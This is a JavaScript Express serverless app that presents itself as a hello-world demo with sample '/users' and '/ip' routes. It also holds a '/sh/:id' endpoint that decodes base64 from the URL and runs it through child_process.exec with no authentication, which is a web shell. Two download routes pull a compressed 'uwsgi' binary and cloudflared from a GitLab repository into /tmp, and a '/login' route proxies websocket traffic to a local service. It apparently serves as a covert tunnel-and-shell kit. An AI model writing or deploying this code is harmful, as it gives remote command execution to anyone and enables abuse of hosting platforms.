import express from 'express';
import Serverless from 'serverless-http';

// var exec = require('child_process').exec;
// const { createProxyMiddleware } = require('http-proxy-middleware');
import { exec } from 'child_process';
import { createProxyMiddleware } from 'http-proxy-middleware';

import https from 'https';
import fs from 'fs';

const app = express();

function downloadFile(url, savepath) {
  const file = fs.createWriteStream(savepath);
  https
    .get(url, (response) => {
      response.pipe(file);

      file.on('finish', () => {
        file.close();
        console.log('Download completed.');
      });
    })
    .on('error', (err) => {
      fs.unlink(savepath, () => {}); // 删除部分下载的文件
      console.error(`Error: ${err.message}`);
    });
}

app.get('/', (req, res) => {
  res.send('Hello World from Express serverless!');
});

app.get('/users', (req, res) => {
  res.json([
    { id: 1, name: 'Alice' },
    { id: 2, name: 'Bob' },
  ]);
});

app.get('/ip', async (req, res) => {
  const data = await fetch('https://ifconfig.me/all.json');
  const json = await data.json();
  res.json(json);
});

app.get('/dl', (req, res) => {
  downloadFile(
    'https://gitlab.com/yuchen168/uwsgi-nginx/-/raw/main/uwsgi-linux-amd64/ws-base64/upx-compress/1.7.2/uwsgi',
    '/tmp/uwsgi'
  );
  res.send('Download uwsgi success!');
});

app.get('/dl2', (req, res) => {
  downloadFile(
    'https://gitlab.com/yuchen168/uwsgi-nginx/-/raw/main/cloudflared/cloudflared-linux-amd64-2023.2.1',
    '/tmp/cloudflared'
  );
  res.send('Download cloudflared success!');
});

app.get('/sh/:id', function (req, res) {
  let s = req.params.id;
  s = Buffer.from(s, 'base64').toString('utf-8');
  exec(s, function (err, stdout, stderr) {
    if (err) {
      res.type('html').send('<pre>' + 'exec error：\n' + err + '</pre>');
    } else {
      res.type('html').send('<pre>' + 'exec success：\n' + stdout + '</pre>');
    }
  });
  //     res.send(req.params);
});

app.use(
  '/login',
  createProxyMiddleware({
    target: 'http://127.0.0.1:7861/',
    changeOrigin: true,
    ws: true,
    //     pathRewrite: {
    //       "^/api": "/login",
    //     },
    onProxyReq: function onProxyReq(proxyReq, req, res) {
      //       console.log(
      //         "-->  ",
      //         req.method,
      //         req.baseUrl,
      //         "->",
      //         proxyReq.host + proxyReq.path
      //       );
    },
  })
);

// You don't need to listen to the port when using serverless functions in production
if (process.env.NODE_ENV === 'dev') {
  app.listen(8080, () => {
    console.log(
      'Server is running on port 8080. Check the app on http://localhost:8080'
    );
  });
}

export const handler = Serverless(app);
